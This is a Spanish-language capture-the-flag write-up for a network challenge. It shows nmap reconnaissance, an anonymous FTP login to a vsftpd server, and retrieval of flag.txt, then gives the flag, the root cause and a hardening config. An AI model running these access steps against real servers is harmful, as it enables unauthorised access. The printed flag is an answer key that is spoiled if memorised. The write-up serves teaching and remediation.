# File transfer

| Campo | Detalle |
|---|---|
| **Categoría** | Network |
| **Puntos** | 50 |
| **Autor** | Lychi3 |
| **Objetivo** | `3.219.242.156` (AWS EC2) |
| **Descripción** | *"Solo un servicio de transferencia de archivos"* |
| **Vulnerabilidad** | Acceso FTP anónimo habilitado |
| **CWE** | CWE-1188 (Insecure Default Initialization of Resource), CWE-306 (Missing Authentication for Critical Function) |
| **OWASP** | A07:2021 – Identification and Authentication Failures |

## 1. Reconocimiento

El primer escaneo con nmap marcó el host como caído:

```text
$ nmap -sV -sC -p- 3.219.242.156
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.12 seconds
```

nmap hace *host discovery* con ICMP/TCP antes de escanear. El firewall del objetivo descarta esos paquetes, así que nmap concluye que no hay host. Para saltarse ese paso se usa `-Pn`. Como la descripción del reto ya decía que el servicio era de transferencia de archivos, la conexión se hizo directamente al puerto 21 (FTP).

## 2. Análisis

Al conectar, el servidor responde con este banner:

```text
220 Welcome to the Kernel CTF FTP server.
```

Las respuestas del servidor (`Consider using PASV`, `Here comes the directory listing`, `Directory send OK`) son las cadenas típicas de **vsftpd**. En vsftpd, el usuario `anonymous` solo entra si la opción `anonymous_enable` está activada. Lo primero a probar en cualquier FTP expuesto es justamente ese login.

## 3. Explotación

```text
$ ftp 3.219.242.156
Connected to 3.219.242.156.
220 Welcome to the Kernel CTF FTP server.
Name (3.219.242.156:h2r6): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    1 ftp      ftp            22 Nov 20 02:42 .
drwxr-xr-x    1 ftp      ftp            22 Nov 20 02:42 ..
-rw-r--r--    1 ftp      ftp            29 Nov 20 02:46 flag.txt
226 Directory send OK.
```

El login `anonymous` se aceptó sin contraseña válida (`230 Login successful`). El directorio raíz del FTP solo contiene `flag.txt`, de 29 bytes: 28 caracteres de la bandera más el salto de línea.

Para leer el archivo hay dos opciones. La primera es descargarlo y leerlo en local:

```text
ftp> get flag.txt
150 Opening BINARY mode data connection for flag.txt (29 bytes).
226 Transfer complete.
29 bytes received in 0.0001 seconds (235.5727 kbytes/s)
ftp> bye
$ cat flag.txt
AHAU{d1s4bl3_4n0n1m0us_us3r}
```

La segunda es mandarlo directo a la terminal con `-` como destino:

```text
ftp> get flag.txt -
150 Opening BINARY mode data connection for flag.txt (29 bytes).
AHAU{d1s4bl3_4n0n1m0us_us3r}
226 Transfer complete.
```

## 4. Causa raíz

El servidor FTP tiene activado el acceso anónimo. Por eso cualquiera puede autenticarse con `anonymous` y leer los archivos del directorio raíz. La configuración probable de vsftpd es:

```ini
anonymous_enable=YES
```

## 5. Intentos fallidos / notas

- `nmap` sin `-Pn` reporta el host como caído. No significa que no haya servicio, solo que bloquea ping.
- `tftp` no estaba instalado y además no era el protocolo correcto: era FTP en TCP/21, no TFTP en UDP/69.
- `cat` y `LS` no son comandos del cliente FTP (`?Invalid command`). Para ver el contenido hay que usar `get archivo -` o descargarlo y leerlo en local.

## 6. Impacto

Cualquier persona en Internet puede listar y descargar los archivos del servidor sin credenciales. Si además estuviera habilitada la escritura anónima (`anon_upload_enable`), el servidor serviría para alojar malware o material ilegal.

## 7. Remediación

En `/etc/vsftpd.conf`:

```ini
anonymous_enable=NO
local_enable=YES
chroot_local_user=YES
ssl_enable=YES
force_local_logins_ssl=YES
force_local_data_ssl=YES
```

Lo ideal es reemplazar FTP por **SFTP** (sobre SSH), que cifra tanto las credenciales como los datos.

## 🚩 Flag

```text
AHAU{d1s4bl3_4n0n1m0us_us3r}
```

---
[⬅ Volver al índice](../../README.md)
